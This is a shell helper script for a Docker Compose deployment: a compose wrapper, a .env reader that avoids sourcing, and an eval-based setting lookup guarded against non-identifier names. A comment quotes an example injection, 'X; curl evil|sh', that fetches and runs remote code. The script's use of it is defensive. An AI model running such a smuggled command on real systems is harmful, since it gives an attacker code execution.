#!/usr/bin/env sh
# Shared helpers. Sourced by the other scripts; not meant to be run directly.
set -eu

DEPLOY_DIR="$(cd "$(dirname "$0")/.." && pwd)"
REPO_ROOT="$(cd "$DEPLOY_DIR/.." && pwd)"
COMPOSE_FILE="$DEPLOY_DIR/compose.yml"
ENV_FILE="$DEPLOY_DIR/.env"

# docker compose (v2) with a fallback to the legacy binary.
if docker compose version >/dev/null 2>&1; then
	dc() { docker compose -f "$COMPOSE_FILE" "$@"; }
elif command -v docker-compose >/dev/null 2>&1; then
	dc() { docker-compose -f "$COMPOSE_FILE" "$@"; }
else
	echo "error: docker compose is not installed" >&2
	exit 1
fi

require_env_file() {
	if [ ! -f "$ENV_FILE" ]; then
		echo "error: $ENV_FILE is missing. Copy .env.example and fill it in." >&2
		exit 1
	fi
}

# Read one NAME=value out of .env WITHOUT sourcing it (a stray backtick or $( ) in a
# value would otherwise run as code). Prints nothing when the name is absent.
dotenv_get() {
	[ -f "$ENV_FILE" ] || return 0
	sed -n "s/^[[:space:]]*$1[[:space:]]*=//p" "$ENV_FILE" | head -n 1 |
		sed -e 's/^"\(.*\)"$/\1/' -e "s/^'\(.*\)'\$/\1/" -e 's/[[:space:]]*$//'
}

# Value from the process environment first, then .env, then the given default.
setting() {
	_name="$1"
	_default="${2:-}"
	# Reading a variable BY NAME is the one thing POSIX sh has no syntax for, so `eval` below is
	# unavoidable - and it runs whatever it is handed: `setting 'X; curl evil|sh'` would execute
	# that. Every caller passes a literal name today, so this guard changes no behaviour; it is
	# what keeps a future caller from passing something off .env or off argv. `set -eu` at the top
	# turns the failure into an aborted script rather than a silently empty value.
	# See docs/internal/security-owasp-2026-09.md, finding A03-4.
	case "$_name" in
		"" | [0-9]* | *[!A-Za-z0-9_]*)
			echo "error: setting() refuses a name that is not a shell identifier: $_name" >&2
			exit 1
			;;
	esac
	eval "_v=\${$_name:-}"
	[ -n "$_v" ] || _v="$(dotenv_get "$_name")"
	[ -n "$_v" ] || _v="$_default"
	printf '%s' "$_v"
}

current_sha() {
	git -C "$REPO_ROOT" rev-parse HEAD 2>/dev/null || echo "unknown"
}

app_container() {
	dc ps -q app
}
